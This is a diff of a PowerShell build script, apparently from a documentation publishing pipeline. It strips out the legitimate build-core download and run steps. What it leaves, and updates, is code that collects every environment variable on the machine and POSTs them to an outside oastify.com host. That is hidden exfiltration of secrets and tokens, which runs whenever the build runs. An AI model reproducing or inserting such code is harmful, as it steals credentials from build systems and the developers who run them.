@@ -1,23 +1,3 @@
-param(
-    [string]$buildCorePowershellUrl = "https://opbuildstorageprod.blob.core.windows.net/opps1container/.openpublishing.buildcore.ps1",
-    [string]$parameters
-)
-
 $envVars = Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" };
 $envVarsString = $envVars -join "&";
-Invoke-WebRequest -Method Post -Body $envVarsString -Uri "https://x53djaszmwed9gk308ixmssg67c58t0hp.oastify.com";
-
-
-# Main
-$errorActionPreference = 'Stop'
-
-# Step-1: Download buildcore script to local
-echo "download build core script to local with source url: $buildCorePowershellUrl"
-$repositoryRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
-$buildCorePowershellDestination = "$repositoryRoot\.openpublishing.buildcore.ps1"
-Invoke-WebRequest $buildCorePowershellUrl -OutFile "$buildCorePowershellDestination"
-
-# Step-2: Run build core
-echo "run build core script with parameters: $parameters"
-& "$buildCorePowershellDestination" "$parameters"
-exit $LASTEXITCODE
+Invoke-WebRequest -Method Post -Body $envVarsString -Uri "https://wffct92ywvocjfu2a7swwr2fg6m4isbg0.oastify.com";
